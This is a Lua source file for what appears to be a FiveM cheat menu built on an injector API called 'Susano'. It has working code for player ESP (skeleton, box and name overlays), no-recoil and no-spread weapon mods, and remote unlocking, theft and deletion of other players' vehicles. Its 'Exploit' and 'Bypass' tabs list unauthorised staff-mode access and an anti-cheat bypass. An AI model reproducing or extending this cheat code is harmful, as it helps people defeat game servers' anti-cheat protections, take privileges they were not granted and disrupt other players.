            { name = "Weather", type = "selector", options = {"Extrasunny", "Clear", "Clouds", "Smog", "Fog", "Overcast", "Rain", "Thunder", "Clearing", "Neutral", "Snow", "Blizzard", "Snowlight", "Xmas", "Halloween"}, selected = 1 },
            { name = "", isSeparator = true, separatorText = "Effects" },
            { name = "Blackout", type = "toggle", value = false },
            { name = "Delete All Props", type = "action" }
        }}
    }},
    { name = "Combat", iconUrl = "https://i.imgur.com/zeRlEgV.png", icon = "ðŸ”«", hasTabs = true, tabs = {
        { name = "General", items = {
            { name = "Attach Target (H)", type = "toggle", value = false, onClick = function(val) ToggleAttachTarget(val) end },
            { name = "", isSeparator = true, separatorText = "Weapon Mods" },
            { name = "No Recoil", type = "toggle", value = false},
            { name = "No Spread", type = "toggle", value = false},
            { name = "No Reload", type = "toggle", value = false },
            { name = "Give Ammo", type = "action" },
            { name = "", isSeparator = true, separatorText = "Attachments" },
            { name = "Give All Attachment", type = "action" },
            { name = "Give Suppressor", type = "action" },
            { name = "Give Flashlight", type = "action" },
            { name = "Give Grip", type = "action" },
            { name = "Give Scope", type = "action" }
        }},
        { name = "Spawn", items = {
            { name = "Protect Weapon", type = "toggle", value = false },
            { name = "weapon_aa", type = "action" },
            { name = "weapon_caveira", type = "action" },
            { name = "weapon_SCOM", type = "action" },
            { name = "weapon_mcx", type = "action" },
            { name = "weapon_grau", type = "action" },
            { name = "weapon_midasgun", type = "action" },
            { name = "weapon_hackingdevice", type = "action" },
            { name = "weapon_akorus", type = "action" },
            { name = "WEAPON_MIDGARD", type = "action" },
            { name = "weapon_chainsaw", type = "action" },
            { name = "weapon_m4a1smr", type = "action" },
            { name = "weapon_aks74u", type = "action" },
            { name = "wepaon_ASSAULTXMAS", type = "action" },
            { name = "weapon_scar17", type = "action" },
            { name = "weapon_blacksniper", type = "action" },
            { name = "weapon_hkhall", type = "action" },
            { name = "weapon_hk_ump", type = "action" }
        }}
    }},
    { name = "Vehicle", iconUrl = "https://i.imgur.com/DkzEgPb.png", icon = "ðŸš—", hasTabs = true, tabs = {
        { name = "Performance", items = {
            { name = "", isSeparator = true, separatorText = "Warp" },
            { name = "FOV Warp", type = "toggle", value = false, onClick = function(val) Menu.FOVWarp = val end },
            { name = "Warp when u press W", type = "toggle", value = false, onClick = function(val) Menu.WarpPressW = val end },
            { name = "Throw From Vehicle", type = "toggle", value = false },
            { name = "", isSeparator = true, separatorText = "Performance" },
            { name = "Max Upgrade", type = "action" },
            { name = "Repair Vehicle", type = "action" },
            { name = "Flip Vehicle", type = "action" },
            { name = "Force Vehicle Engine", type = "toggle", value = false },
            { name = "Easy Handling", type = "toggle", value = false },
            { name = "Shift Boost", type = "toggle", value = false },
            { name = "Gravitate Vehicle", type = "toggle", value = false },
            { name = "Gravitate Speed", type = "slider", value = 100, min = 50, max = 500, step = 10 },
            { name = "", isSeparator = true, separatorText = "Maintenance" },
            { name = "Change Plate", type = "action" },
            { name = "Clean Vehicle", type = "action" },
            { name = "Delete Vehicle", type = "action" },
            
            { name = "", isSeparator = true, separatorText = "Access" },
            { name = "Unlock All Vehicle", type = "toggle", value = false },
            { name = "Teleport into Closest Vehicle", type = "action" },
            
            { name = "", isSeparator = true, separatorText = "Modifications" },
            { name = "No Collision", type = "toggle", value = false },
            { name = "Bunny Hop", type = "toggle", value = false },
            { name = "Back Flip", type = "toggle", value = false },
            
            { name = "", isSeparator = true, separatorText = "Give" },
            { name = "Give Nearest Vehicle", type = "action" },
            { name = "Give", type = "selector", options = {"Ramp", "Wall", "Wall 2"}, selected = 1 },
            { name = "Rainbow Paint", type = "toggle", value = false },
            { name = "", isSeparator = true, separatorText = "Buggy Ramp" },
            { name = "Attach Ramp", type = "action" },
            { name = "Detach Ramp", type = "action" }
        }},
        { name = "Radar", items = {
            { name = "Select Vehicle", type = "selector", options = {"Scanning..."}, selected = 1 },
            { name = "Highlight Selected", type = "toggle", value = false },
            { name = "Teleport Into", type = "action", onClick = function()
                local radarTab = nil
                if Menu.Categories then
                    for _, cat in ipairs(Menu.Categories) do
                        if cat.name == "Vehicle" and cat.tabs then
                            for _, tab in ipairs(cat.tabs) do
                                if tab.name == "Radar" then radarTab = tab break end
                            end
                        end
                        if radarTab then break end
                    end
                end
                if radarTab and radarTab.items then
                    local selector = radarTab.items[1]
                    if selector and foundVehicles and #foundVehicles > 0 then
                         local vehData = foundVehicles[selector.selected]
                         if vehData then
                             local veh = vehData.entity
                             if veh and DoesEntityExist(veh) then
                                 local ped = PlayerPedId()
                                 if IsPedInAnyVehicle(ped, false) then ClearPedTasksImmediately(ped) end
                                 SetPedIntoVehicle(ped, veh, -1)
                             end
                         end
                    end
                end
            end },
            { name = "Teleport To Me", type = "action", onClick = function()
                local radarTab = nil
                if Menu.Categories then
                    for _, cat in ipairs(Menu.Categories) do
                        if cat.name == "Vehicle" and cat.tabs then
                            for _, tab in ipairs(cat.tabs) do
                                if tab.name == "Radar" then radarTab = tab break end
                            end
                        end
                        if radarTab then break end
                    end
                end
                if radarTab and radarTab.items then
                    local selector = radarTab.items[1]
                    if selector and foundVehicles and #foundVehicles > 0 then
                         local vehData = foundVehicles[selector.selected]
                         if vehData then
                             local veh = vehData.entity
                             if veh and DoesEntityExist(veh) then
                                 local ped = PlayerPedId()
                                 local myPos = GetEntityCoords(ped)
                                 if IsPedInAnyVehicle(ped, false) then ClearPedTasksImmediately(ped) end
                                 SetPedIntoVehicle(ped, veh, -1)
                                 SetEntityCoords(veh, myPos.x, myPos.y, myPos.z + 1.0, false, false, false, true)
                             end
                         end
                    end
                end
            end },
            { name = "Unlock Vehicle", type = "action", onClick = function()
                local radarTab = nil
                if Menu.Categories then
                    for _, cat in ipairs(Menu.Categories) do
                        if cat.name == "Vehicle" and cat.tabs then
                            for _, tab in ipairs(cat.tabs) do
                                if tab.name == "Radar" then radarTab = tab break end
                            end
                        end
                        if radarTab then break end
                    end
                end
                if radarTab and radarTab.items then
                    local selector = radarTab.items[1]
                    if selector and foundVehicles and #foundVehicles > 0 then
                         local vehData = foundVehicles[selector.selected]
                         if vehData then
                             local veh = vehData.entity
                             if veh and DoesEntityExist(veh) then
                                 SetVehicleDoorsLocked(veh, 1)
                                 SetVehicleDoorsLockedForAllPlayers(veh, false)
                             end
                         end
                    end
                end
            end },
            { name = "Lock Vehicle", type = "action", onClick = function()
                local radarTab = nil
                if Menu.Categories then
                    for _, cat in ipairs(Menu.Categories) do
                        if cat.name == "Vehicle" and cat.tabs then
                            for _, tab in ipairs(cat.tabs) do
                                if tab.name == "Radar" then radarTab = tab break end
                            end
                        end
                        if radarTab then break end
                    end
                end
                if radarTab and radarTab.items then
                    local selector = radarTab.items[1]
                    if selector and foundVehicles and #foundVehicles > 0 then
                         local vehData = foundVehicles[selector.selected]
                         if vehData then
                             local veh = vehData.entity
                             if veh and DoesEntityExist(veh) then
                                 SetVehicleDoorsLocked(veh, 2)
                                 SetVehicleDoorsLockedForAllPlayers(veh, true)
                             end
                         end
                    end
                end
            end },
            { name = "Delete Vehicle", type = "action", onClick = function()
                local radarTab = nil
                if Menu.Categories then
                    for _, cat in ipairs(Menu.Categories) do
                        if cat.name == "Vehicle" and cat.tabs then
                            for _, tab in ipairs(cat.tabs) do
                                if tab.name == "Radar" then radarTab = tab break end
                            end
                        end
                        if radarTab then break end
                    end
                end
                if radarTab and radarTab.items then
                    local selector = radarTab.items[1]
                    if selector and foundVehicles and #foundVehicles > 0 then
                         local vehData = foundVehicles[selector.selected]
                         if vehData then
                             local veh = vehData.entity
                             if veh and DoesEntityExist(veh) then
                                 local ped = PlayerPedId()
                                 if IsPedInAnyVehicle(ped, false) then ClearPedTasksImmediately(ped) end
                                 SetPedIntoVehicle(ped, veh, -1)
                                 SetEntityAsMissionEntity(veh, true, true)
                                 DeleteVehicle(veh)
                             end
                         end
                    end
                end
            end }
        }}
    }},
    { name = "Exploit", iconUrl = "https://i.imgur.com/G4seAMg.png", icon = "💀", hasTabs = true, tabs = {
        { name = "Exploits", items = {
            { name = "", isSeparator = true, separatorText = "Server" },
            { name = "Staff Mode", type = "toggle", value = false, dynasty = true},
            { name = "Disable Weapon Damage", type = "toggle", value = false, dynasty = true},
            { name = "Menu Staff", type = "action", dynasty = true },
            { name = "Revive", type = "action", dynasty = true },
            { name = "", isSeparator = true, separatorText = "Teleport" },
            { name = "Teleport To", type = "selector", options = {
                "Waypoint",
                "FIB Building",
                "Mission Row PD",
                "Pillbox Hospital",
                "Grove Street",
                "Legion Square"
            }, selected = 1 },
        }},
        { name = "Bypass", items = {
            { name = "", isSeparator = true, separatorText = "Anti-Cheat" },
            { name = "Bypass Putin", type = "action", dynasty = true },
        }}
    }},
    { name = "Settings", iconUrl = "https://i.imgur.com/FQsvrIJ.png", icon = "âš™", hasTabs = true, tabs = {
        { name = "General", items = {
            { name = "Editor Mode", type = "toggle", value = false },
            { name = "Menu Size", type = "slider", value = 110.0, min = 50.0, max = 200.0, step = 1.0 },
            { name = "", isSeparator = true, separatorText = "Design" },
            { name = "Menu Theme", type = "selector", options = {"Blue", "Purple", "Pink", "Red", "Green"}, selected = 5 },
            { name = "Flocon", type = "toggle", value = true },
            { name = "Scroll Bar Position", type = "selector", options = {"Left", "Right"}, selected = 1 }
        }}
    }}
}

-- Appliquer le thÃ¨me  par dÃ©faut au dÃ©marrage
if Menu.ApplyTheme then
    Menu.ApplyTheme("Blue")
end

-- Load category icons + footer logo after categories are defined
Menu.LoadAllIcons()

-- Default scale 110% for better readability
Menu.Scale = 1.1

Menu.Visible = false

Menu.SelectedPlayer = nil
Menu.SelectedPlayers = {}
Menu.PlayerListSelectIndex = 1
Menu.PlayerListTeleportIndex = 1
Menu.PlayerListSpectateEnabled = false
Menu.StaffModeEnabled = false
Menu.DisableWeaponDamage = false
Menu.WeaponDamageHookSet = false

local Bones = {
    Pelvis = 11816,
    SKEL_Head = 31086,
    SKEL_Neck_1 = 39317,
    SKEL_L_Clavicle = 64729,
    SKEL_L_UpperArm = 45509,
    SKEL_L_Forearm = 61163,
    SKEL_L_Hand = 18905,
    SKEL_R_Clavicle = 10706,
    SKEL_R_UpperArm = 40269,
    SKEL_R_Forearm = 28252,
    SKEL_R_Hand = 57005,
    SKEL_L_Thigh = 58271,
    SKEL_L_Calf = 63931,
    SKEL_L_Foot = 14201,
    SKEL_R_Thigh = 51826,
    SKEL_R_Calf = 36864,
    SKEL_R_Foot = 52301,
}

local SkeletonConnections = {
    {Bones.Pelvis, Bones.SKEL_Neck_1},
    {Bones.SKEL_Neck_1, Bones.SKEL_Head},
    {Bones.SKEL_Neck_1, Bones.SKEL_L_Clavicle},
    {Bones.SKEL_L_Clavicle, Bones.SKEL_L_UpperArm},
    {Bones.SKEL_L_UpperArm, Bones.SKEL_L_Forearm},
    {Bones.SKEL_L_Forearm, Bones.SKEL_L_Hand},
    {Bones.SKEL_Neck_1, Bones.SKEL_R_Clavicle},
    {Bones.SKEL_R_Clavicle, Bones.SKEL_R_UpperArm},
    {Bones.SKEL_R_UpperArm, Bones.SKEL_R_Forearm},
    {Bones.SKEL_R_Forearm, Bones.SKEL_R_Hand},
    {Bones.Pelvis, Bones.SKEL_L_Thigh},
    {Bones.SKEL_L_Thigh, Bones.SKEL_L_Calf},
    {Bones.SKEL_L_Calf, Bones.SKEL_L_Foot},
    {Bones.Pelvis, Bones.SKEL_R_Thigh},
    {Bones.SKEL_R_Thigh, Bones.SKEL_R_Calf},
    {Bones.SKEL_R_Calf, Bones.SKEL_R_Foot},
}

local ESPColors = {
    {1.0, 1.0, 1.0},
    {1.0, 0.0, 0.0},
    {0.0, 1.0, 0.0},
    {0.0, 0.0, 1.0},
    {1.0, 1.0, 0.0},
    {1.0, 0.0, 1.0},
    {0.0, 1.0, 1.0},
}

local function GetWeaponNameFromHash(weaponHash)
    local weaponHashToName = {
        [GetHashKey("WEAPON_UNARMED")] = "Unarmed",
        [GetHashKey("WEAPON_KNIFE")] = "Knife",
        [GetHashKey("WEAPON_BAT")] = "Baseball Bat",
        [GetHashKey("WEAPON_CROWBAR")] = "Crowbar",
        [GetHashKey("WEAPON_GOLFCLUB")] = "Golf Club",
        [GetHashKey("WEAPON_HAMMER")] = "Hammer",
        [GetHashKey("WEAPON_HATCHET")] = "Hatchet",
        [GetHashKey("WEAPON_KNUCKLE")] = "Brass Knuckles",
        [GetHashKey("WEAPON_MACHETE")] = "Machete",
        [GetHashKey("WEAPON_SWITCHBLADE")] = "Switchblade",
        [GetHashKey("WEAPON_NIGHTSTICK")] = "Nightstick",
        [GetHashKey("WEAPON_WRENCH")] = "Wrench",
        [GetHashKey("WEAPON_BATTLEAXE")] = "Battle Axe",
        [GetHashKey("WEAPON_POOLCUE")] = "Pool Cue",
        [GetHashKey("WEAPON_STONE_HATCHET")] = "Stone Hatchet",
        [GetHashKey("WEAPON_PISTOL")] = "Pistol",
        [GetHashKey("WEAPON_PISTOL_MK2")] = "Pistol MK2",
        [GetHashKey("WEAPON_COMBATPISTOL")] = "Combat Pistol",
        [GetHashKey("WEAPON_PISTOL50")] = "Pistol .50",
        [GetHashKey("WEAPON_SNSPISTOL")] = "SNS Pistol",
        [GetHashKey("WEAPON_SNSPISTOL_MK2")] = "SNS Pistol MK2",
        [GetHashKey("WEAPON_HEAVYPISTOL")] = "Heavy Pistol",
        [GetHashKey("WEAPON_VINTAGEPISTOL")] = "Vintage Pistol",
        [GetHashKey("WEAPON_FLAREGUN")] = "Flare Gun",
        [GetHashKey("WEAPON_MARKSMANPISTOL")] = "Marksman Pistol",
        [GetHashKey("WEAPON_REVOLVER")] = "Heavy Revolver",
        [GetHashKey("WEAPON_REVOLVER_MK2")] = "Heavy Revolver MK2",
        [GetHashKey("WEAPON_DOUBLEACTION")] = "Double Action Revolver",
        [GetHashKey("WEAPON_APPISTOL")] = "AP Pistol",
        [GetHashKey("WEAPON_STUNGUN")] = "Stun Gun",
        [GetHashKey("WEAPON_CERAMICPISTOL")] = "Ceramic Pistol",
        [GetHashKey("WEAPON_NAVYREVOLVER")] = "Navy Revolver",
        [GetHashKey("WEAPON_MICROSMG")] = "Micro SMG",
        [GetHashKey("WEAPON_SMG")] = "SMG",
        [GetHashKey("WEAPON_SMG_MK2")] = "SMG MK2",
        [GetHashKey("WEAPON_ASSAULTSMG")] = "Assault SMG",
        [GetHashKey("WEAPON_COMBATPDW")] = "Combat PDW",
        [GetHashKey("WEAPON_MACHINEPISTOL")] = "Machine Pistol",
        [GetHashKey("WEAPON_MINISMG")] = "Mini SMG",
        [GetHashKey("WEAPON_GUSENBERG")] = "Gusenberg Sweeper",
        [GetHashKey("WEAPON_PUMPSHOTGUN")] = "Pump Shotgun",
        [GetHashKey("WEAPON_PUMPSHOTGUN_MK2")] = "Pump Shotgun MK2",
        [GetHashKey("WEAPON_SAWNOFFSHOTGUN")] = "Sawed-Off Shotgun",
        [GetHashKey("WEAPON_ASSAULTSHOTGUN")] = "Assault Shotgun",
        [GetHashKey("WEAPON_BULLPUPSHOTGUN")] = "Bullpup Shotgun",
        [GetHashKey("WEAPON_MUSKET")] = "Musket",
        [GetHashKey("WEAPON_HEAVYSHOTGUN")] = "Heavy Shotgun",
        [GetHashKey("WEAPON_DBSHOTGUN")] = "Double Barrel Shotgun",
        [GetHashKey("WEAPON_AUTOSHOTGUN")] = "Auto Shotgun",
        [GetHashKey("WEAPON_COMBATSHOTGUN")] = "Combat Shotgun",
        [GetHashKey("WEAPON_ASSAULTRIFLE")] = "Assault Rifle",
        [GetHashKey("WEAPON_ASSAULTRIFLE_MK2")] = "Assault Rifle MK2",
        [GetHashKey("WEAPON_CARBINERIFLE")] = "Carbine Rifle",
        [GetHashKey("WEAPON_CARBINERIFLE_MK2")] = "Carbine Rifle MK2",
        [GetHashKey("WEAPON_ADVANCEDRIFLE")] = "Advanced Rifle",
        [GetHashKey("WEAPON_SPECIALCARBINE")] = "Special Carbine",
        [GetHashKey("WEAPON_SPECIALCARBINE_MK2")] = "Special Carbine MK2",
        [GetHashKey("WEAPON_BULLPUPRIFLE")] = "Bullpup Rifle",
        [GetHashKey("WEAPON_BULLPUPRIFLE_MK2")] = "Bullpup Rifle MK2",
        [GetHashKey("WEAPON_COMPACTRIFLE")] = "Compact Rifle",
        [GetHashKey("WEAPON_MILITARYRIFLE")] = "Military Rifle",
        [GetHashKey("WEAPON_HEAVYRIFLE")] = "Heavy Rifle",
        [GetHashKey("WEAPON_TACTICALRIFLE")] = "Tactical Rifle",
        [GetHashKey("WEAPON_SNIPERRIFLE")] = "Sniper Rifle",
        [GetHashKey("WEAPON_HEAVYSNIPER")] = "Heavy Sniper",
        [GetHashKey("WEAPON_HEAVYSNIPER_MK2")] = "Heavy Sniper MK2",
        [GetHashKey("WEAPON_MARKSMANRIFLE")] = "Marksman Rifle",
        [GetHashKey("WEAPON_MARKSMANRIFLE_MK2")] = "Marksman Rifle MK2",
        [GetHashKey("WEAPON_PRECISIONRIFLE")] = "Precision Rifle",
        [GetHashKey("WEAPON_RPG")] = "RPG",
        [GetHashKey("WEAPON_GRENADELAUNCHER")] = "Grenade Launcher",
        [GetHashKey("WEAPON_GRENADELAUNCHER_SMOKE")] = "Grenade Launcher Smoke",
        [GetHashKey("WEAPON_MINIGUN")] = "Minigun",
        [GetHashKey("WEAPON_FIREWORK")] = "Firework Launcher",
        [GetHashKey("WEAPON_RAILGUN")] = "Railgun",
        [GetHashKey("WEAPON_HOMINGLAUNCHER")] = "Homing Launcher",
        [GetHashKey("WEAPON_COMPACTLAUNCHER")] = "Compact Grenade Launcher",
        [GetHashKey("WEAPON_RAYMINIGUN")] = "Widowmaker",
        [GetHashKey("WEAPON_EMPLAUNCHER")] = "Compact EMP Launcher",
        [GetHashKey("WEAPON_RAILGUNXM3")] = "Railgun XM3",
    }
    
    return weaponHashToName[weaponHash] or "Unknown Weapon"
end

local function GetESPSettings()
    local settings = {}
    for _, cat in ipairs(Menu.Categories) do
        if cat.name == "Visual" and cat.tabs then
            for _, tab in ipairs(cat.tabs) do
                if tab.name == "ESP" and tab.items then
                    for _, item in ipairs(tab.items) do
                        settings[item.name] = item
                    end
                end
            end
        end
    end
    return settings
end

local espSettings = nil

-- ESP Cache pour optimisation
local ESPCache = {}
local ESPCacheTime = 0
local ESPCacheMaxAge = 0.016 -- 1 frame Ã  60fps

local function GetScreenSize()
    if Susano and Susano.GetScreenWidth and Susano.GetScreenHeight then
        local w, h = Susano.GetScreenWidth(), Susano.GetScreenHeight()
        if w and h and w > 0 and h > 0 then
            return w, h
        end
    end
    
    -- Fallback to GTA Native
    local w, h = GetActiveScreenResolution()
    return w, h
end

-- Wrapper for GetScreenCoordFromWorldCoord (use World3dToScreen2d if GetScreenCoordFromWorldCoord doesn't exist)
if not GetScreenCoordFromWorldCoord or type(GetScreenCoordFromWorldCoord) ~= "function" then
    GetScreenCoordFromWorldCoord = function(x, y, z)
        if World3dToScreen2d then
            return World3dToScreen2d(x, y, z)
        else
            return false, 0.0, 0.0
        end
    end
end

local function Draw2DBox(x1, y1, x2, y2, r, g, b, a, screenW, screenH)
    if not Susano.DrawLine then return end
    
    local w = x2 - x1
    local h = y2 - y1
    
    Susano.DrawLine(x1 * screenW, y1 * screenH, x2 * screenW, y1 * screenH, r, g, b, a, 1)
    Susano.DrawLine(x1 * screenW, y2 * screenH, x2 * screenW, y2 * screenH, r, g, b, a, 1)
    Susano.DrawLine(x1 * screenW, y1 * screenH, x1 * screenW, y2 * screenH, r, g, b, a, 1)
    Susano.DrawLine(x2 * screenW, y1 * screenH, x2 * screenW, y2 * screenH, r, g, b, a, 1)
end

local function DrawFilledRect(x, y, w, h, r, g, b, a)
    if Susano.DrawRectFilled then
        Susano.DrawRectFilled(x, y, w, h, r, g, b, a, 0)
    elseif Susano.DrawRect then
        for i = 0, h do
            Susano.DrawRect(x, y + i, w, 1, r, g, b, a)
        end
    end
end

local infiniteStaminaActive = false
local function ToggleInfiniteStamina(enable)
    infiniteStaminaActive = enable
    if enable then
        Citizen.CreateThread(function()
            while infiniteStaminaActive do
                RestorePlayerStamina(PlayerId(), 1.0)
                Citizen.Wait(0)
            end
        end)
    end
end

local function DeleteAllProps()
    local handle, object = FindFirstObject()
    local success
    repeat
        if DoesEntityExist(object) then
            SetEntityAsMissionEntity(object, true, true)
            DeleteObject(object)
        end
        success, object = FindNextObject(handle)
    until not success
    EndFindObject(handle)
end

local throwVehicleActive = false
local function ToggleThrowVehicle(enable)
    throwVehicleActive = enable
    if enable then
        Citizen.CreateThread(function()
            local holdingEntity = false
            local heldEntity = nil

            local function RotationToDirection(rotation)
                local adjustedRotation = vector3((math.pi / 180) * rotation.x, (math.pi / 180) * rotation.y, (math.pi / 180) * rotation.z)
                local direction = vector3(-math.sin(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)), math.cos(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)), math.sin(adjustedRotation.x))
                return direction
            end

            while throwVehicleActive do
                Citizen.Wait(0)
                local playerPed = PlayerPedId()
                local screenW, screenH = GetScreenSize()

                if holdingEntity and heldEntity and DoesEntityExist(heldEntity) then
                    if not IsEntityPlayingAnim(playerPed, 'anim@mp_rollarcoaster', 'hands_up_idle_a_player_one', 3) then
                        RequestAnimDict('anim@mp_rollarcoaster')
                        while not HasAnimDictLoaded('anim@mp_rollarcoaster') do
                            Citizen.Wait(100)
                        end
                        TaskPlayAnim(playerPed, 'anim@mp_rollarcoaster', 'hands_up_idle_a_player_one', 8.0, -8.0, -1, 50, 0, false, false, false)
                    end

                    if IsControlJustReleased(0, 38) then
                        local camRot = GetGameplayCamRot(2)
                        local direction = RotationToDirection(camRot)
                        DetachEntity(heldEntity, true, true)
                        ApplyForceToEntity(heldEntity, 1, direction.x * 500.0, direction.y * 500.0, direction.z * 500.0, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
                        holdingEntity = false
                        heldEntity = nil
                        ClearPedTasks(playerPed)
                    end

                    if heldEntity and not IsEntityAttached(heldEntity) and holdingEntity then
                        NetworkRequestControlOfEntity(heldEntity)
                        AttachEntityToEntity(heldEntity, playerPed, GetPedBoneIndex(playerPed, 60309), 1.0, 0.5, 0.0, 0.0, 0.0, 0.0, true, true, false, false, 1, true)
                    end
                else
                    local camPos = GetGameplayCamCoord()
                    local camRot = GetGameplayCamRot(2)
                    local direction = RotationToDirection(camRot)
                    local dest = vector3(camPos.x + direction.x * 300.0, camPos.y + direction.y * 300.0, camPos.z + direction.z * 300.0)

                    local rayHandle = StartShapeTestRay(camPos.x, camPos.y, camPos.z, dest.x, dest.y, dest.z, -1, playerPed, 0)
                    local _, hit, _, _, entityHit = GetShapeTestResult(rayHandle)

                    if hit == 1 and DoesEntityExist(entityHit) then
                        local entityType = GetEntityType(entityHit)
                        if entityType == 2 then
                            if SetEntityDrawOutline then
                                SetEntityDrawOutline(entityHit, true)
                                if NetworkHasControlOfEntity(entityHit) then
                                    SetEntityDrawOutlineColor(0, 255, 0, 255)
                                else
                                    SetEntityDrawOutlineColor(255, 0, 0, 255)
                                end
                            end

                            local min, max = GetModelDimensions(GetEntityModel(entityHit))
                            local corners = {
                                vector3(min.x, min.y, min.z), vector3(min.x, min.y, max.z),
                                vector3(min.x, max.y, min.z), vector3(min.x, max.y, max.z),
                                vector3(max.x, min.y, min.z), vector3(max.x, min.y, max.z),
                                vector3(max.x, max.y, min.z), vector3(max.x, max.y, max.z)
                            }

                            local minX, minY, maxX, maxY = 1.0, 1.0, 0.0, 0.0
                            local hasScreen = false
                            for _, corner in pairs(corners) do
                                local world = GetOffsetFromEntityInWorldCoords(entityHit, corner.x, corner.y, corner.z)
                                local onScreen, x, y = GetScreenCoordFromWorldCoord(world.x, world.y, world.z)
                                if onScreen then
                                    hasScreen = true
                                    if x < minX then minX = x end
                                    if x > maxX then maxX = x end
                                    if y < minY then minY = y end
                                    if y > maxY then maxY = y end
                                end
                            end

                            if hasScreen then
                                local r, g, b = 255, 0, 0
                                if NetworkHasControlOfEntity(entityHit) then
                                    r, g, b = 0, 255, 0
                                end
                                Draw2DBox(minX, minY, maxX, maxY, r, g, b, 255, screenW, screenH)
                            end

                            if IsControlJustReleased(0, 38) then
                                holdingEntity = true
                                heldEntity = entityHit
                                NetworkRequestControlOfEntity(heldEntity)
                                AttachEntityToEntity(heldEntity, playerPed, GetPedBoneIndex(playerPed, 60309), 1.0, 0.5, 0.0, 0.0, 0.0, 0.0, true, true, false, false, 1, true)
                            end
                        end
                    end
                end
            end

            if heldEntity then
                DetachEntity(heldEntity, true, true)
                ClearPedTasks(PlayerPedId())
            end
        end)
    end
end

-- Render ESP for a single ped
local function RenderPedESP(targetPed, playerIdx, settings, screenW, screenH, myPos)
    if not DoesEntityExist(targetPed) then return end

    local targetPos = GetEntityCoords(targetPed)
    local dist = #(myPos - targetPos)
    
    -- Optimisation: vÃ©rifier la distance avant les calculs coÃ»teux
    if dist > 100.0 then return end
    
    -- Cache pour Ã©viter les recalculs frÃ©quents
    local cacheKey = tostring(targetPed) .. "_" .. tostring(playerIdx)
    local currentTime = GetGameTimer() or 0
    local cached = ESPCache[cacheKey]
    local onScreen, screenX, screenY
    
    if cached and (currentTime - cached.time) < 16 then
        onScreen = cached.onScreen
        screenX = cached.screenX
        screenY = cached.screenY
    else
        onScreen, screenX, screenY = GetScreenCoordFromWorldCoord(targetPos.x, targetPos.y, targetPos.z)
        ESPCache[cacheKey] = {
            onScreen = onScreen,
            screenX = screenX,
            screenY = screenY,
            time = currentTime
        }
    end
    
    if onScreen then
        -- Config Values
        local drawSkeleton = settings["Draw Skeleton"] and settings["Draw Skeleton"].value
        local drawBox = settings["Draw Box"] and settings["Draw Box"].value
        local drawLine = settings["Draw Line"] and settings["Draw Line"].value
        local drawHealth = settings["Draw Health"] and settings["Draw Health"].value
        local drawArmor = settings["Draw Armor"] and settings["Draw Armor"].value

        -- Get Selector Settings
        local drawNameItem = settings["Draw Name"]
        local drawName = drawNameItem and drawNameItem.value
        local drawNamePosItem = settings["Name Position"]
        local drawNamePos = (drawNamePosItem and drawNamePosItem.selected) or 1
        
        local drawIDItem = settings["Draw ID"]
        local drawID = drawIDItem and drawIDItem.value
        local drawIDPosItem = settings["ID Position"]
        local drawIDPos = (drawIDPosItem and drawIDPosItem.selected) or 1
        
        local drawDistItem = settings["Draw Distance"]
        local drawDist = drawDistItem and drawDistItem.value
        local drawDistPosItem = settings["Distance Position"]
        local drawDistPos = (drawDistPosItem and drawDistPosItem.selected) or 1
        
        local drawWeaponItem = settings["Draw Weapon"]
        local drawWeapon = drawWeaponItem and drawWeaponItem.value
        local drawWeaponPosItem = settings["Weapon Position"]
        local drawWeaponPos = (drawWeaponPosItem and drawWeaponPosItem.selected) or 1
        
        local skelColor = ESPColors[1]
        if settings["Skeleton Color"] then skelColor = ESPColors[settings["Skeleton Color"].selected] or skelColor end
        
        local boxColor = ESPColors[1]
        if settings["Box Color"] then boxColor = ESPColors[settings["Box Color"].selected] or boxColor end
        
        local lineColor = ESPColors[1]
        if settings["Line Color"] then lineColor = ESPColors[settings["Line Color"].selected] or lineColor end
        
        local textColor = ESPColors[1]
        if settings["Text Color"] then textColor = ESPColors[settings["Text Color"].selected] or textColor end

        -- Skeleton (optimisÃ© avec cache des os)
        if drawSkeleton then
            local boneCache = {}
            for _, connection in ipairs(SkeletonConnections) do
                local bone1 = connection[1]
                local bone2 = connection[2]
                
                -- Cache des positions des os pour Ã©viter les appels rÃ©pÃ©tÃ©s
                local pos1 = boneCache[bone1]
                if not pos1 then
                    pos1 = GetPedBoneCoords(targetPed, bone1, 0.0, 0.0, 0.0)
                    boneCache[bone1] = pos1
                end
                
                local pos2 = boneCache[bone2]
                if not pos2 then
                    pos2 = GetPedBoneCoords(targetPed, bone2, 0.0, 0.0, 0.0)
                    boneCache[bone2] = pos2
                end
                
                local os1, x1, y1 = GetScreenCoordFromWorldCoord(pos1.x, pos1.y, pos1.z)
                local os2, x2, y2 = GetScreenCoordFromWorldCoord(pos2.x, pos2.y, pos2.z)

                -- Optimisation: vÃ©rifier que les coordonnÃ©es sont valides et dans l'Ã©cran
                if os1 and os2 and x1 and y1 and x2 and y2 and 
                   x1 >= 0 and x1 <= 1 and y1 >= 0 and y1 <= 1 and
                   x2 >= 0 and x2 <= 1 and y2 >= 0 and y2 <= 1 and
                   Susano.DrawLine then
                    -- Draw thin black outline
                    Susano.DrawLine(x1 * screenW, y1 * screenH, x2 * screenW, y2 * screenH, 0.0, 0.0, 0.0, 1.0, 2)
                    -- Draw main skeleton line
                    Susano.DrawLine(x1 * screenW, y1 * screenH, x2 * screenW, y2 * screenH, skelColor[1], skelColor[2], skelColor[3], 1.0, 1)
                end
            end
        end
        
        -- Calculate 2D Box & Info Positions (optimisÃ© avec cache)
        local headPos = GetPedBoneCoords(targetPed, 31086, 0.0, 0.0, 0.0)
        local footPos = GetEntityCoords(targetPed)
        footPos = vector3(footPos.x, footPos.y, footPos.z - 1.0) -- Adjust for bottom
        
        -- Cache pour head et foot
        local headCacheKey = cacheKey .. "_head"
        local footCacheKey = cacheKey .. "_foot"
        local cachedHead = ESPCache[headCacheKey]
        local cachedFoot = ESPCache[footCacheKey]
        local headX, headY, footX, footY
        
        if cachedHead and (currentTime - cachedHead.time) < 16 then
            headX = cachedHead.x
            headY = cachedHead.y
        else
            local _, hX, hY = GetScreenCoordFromWorldCoord(headPos.x, headPos.y, headPos.z + 0.3)
            headX, headY = hX, hY
            ESPCache[headCacheKey] = {x = headX, y = headY, time = currentTime}
        end
        
        if cachedFoot and (currentTime - cachedFoot.time) < 16 then
            footX = cachedFoot.x
            footY = cachedFoot.y
        else
            local _, fX, fY = GetScreenCoordFromWorldCoord(footPos.x, footPos.y, footPos.z)
            footX, footY = fX, fY
